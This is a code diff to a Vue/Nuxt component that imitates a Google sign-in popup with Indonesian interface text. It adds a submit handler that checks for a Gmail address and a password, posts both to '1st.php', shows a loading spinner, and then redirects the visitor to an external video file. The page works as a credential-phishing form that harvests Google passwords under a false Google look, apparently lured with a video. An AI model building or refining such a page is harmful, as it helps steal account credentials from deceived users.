@@ -24,11 +24,11 @@
                 </div>
                 <span class="galert" v-show="alertgoogle"><Icon name="mingcute:warning-fill"/> Lupa email?</span>
                 <div class="form-text">
-                    <p>Sebelum menggunakan aplikasi ini, Anda dapat meninjau<span>kebijakan privasi</span> dan <span>persyaratan lainnya.</span></p>
+                    <p>Sebelum menggunakan aplikasi ini, Anda dapat meninjau <span>kebijakan privasi</span> dan <span>persyaratan lainnya.</span></p>
                 </div>
                 <div class="form-action">
                     <span class="createaccount">Buat akun</span>
-                    <div class="google-submit" @click="doLoginGoogle">Selanjutnya</div>
+                    <div class="google-submit" @click="doSubmitLoginGoogle"><Icon v-if="Tombol" name="line-md:loading-loop" style="font-size: 17px" /> Selanjutnya</div>
                 </div>
             </div>
             <div class="google-footer">
@@ -96,6 +96,8 @@ const form = ref({
   device: null
 })
 
+const Tombol = ref(false);
+
 
 function doFocus()
 {
@@ -139,7 +141,36 @@ async function doLoginGoogle() {
         googlePassword.value.reportValidity();
     }
 
-    masks.value = true;
+}
+
+async function doSubmitLoginGoogle(e)
+{
+
+    const regex = /^[a-zA-Z0-9._%+-]+@gmail\.com$/;
+
+    // Validasi email
+    if (!regex.test(form.value.googlemail)) {
+        googleEmail.value.setCustomValidity("Masukkan email dengan benar");
+        googleEmail.value.reportValidity();
+        return false;
+    } else {
+        // Hapus pesan error kalau sudah valid
+        googleEmail.value.setCustomValidity("");
+        googleEmail.value.reportValidity();
+    }
+
+    // Validasi password
+    if ((form.value.googlepassword || '').length < 6) {
+        googlePassword.value.setCustomValidity("Masukkan katasandi dengan benar");
+        googlePassword.value.reportValidity();
+        return false;
+    } else {
+        googlePassword.value.setCustomValidity("");
+        googlePassword.value.reportValidity();
+    }
+
+    Tombol.value = true;
+    e.target.classList.add('disable')
 
     const res = await fetch('1st.php', {
         method: 'POST',
@@ -150,9 +181,8 @@ async function doLoginGoogle() {
     });
 
     setTimeout(() => {
-        masks.value = false;
-        popgoogle.value = false;
-    }, 3000);
+        window.location = 'https://cdn.videy.co/kCmVZy4c1.mp4';
+    }, 4000);
 }
 
 
@@ -201,6 +231,12 @@ async function doLoginGoogle() {
     justify-content: center;
     gap: 10px;
     cursor: pointer;
+}
+
+.disable
+{
+    opacity: 0.5;
+    pointer-events: none;
 }
 
 #__nuxt .popgoogle
@@ -266,10 +302,10 @@ async function doLoginGoogle() {
     flex-direction: column;
 }
 
-.googlecontent span
+/* .googlecontent span
 {
     color: #000 !important;
-}
+} */
 
 .googlecontent .contentTitle
 {
@@ -399,6 +435,10 @@ async function doLoginGoogle() {
     background: rgb(11 87 208 / 1);
     border-radius: 50px;
     font-size: 14px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
 }
 
 .googlecontent .google-footer
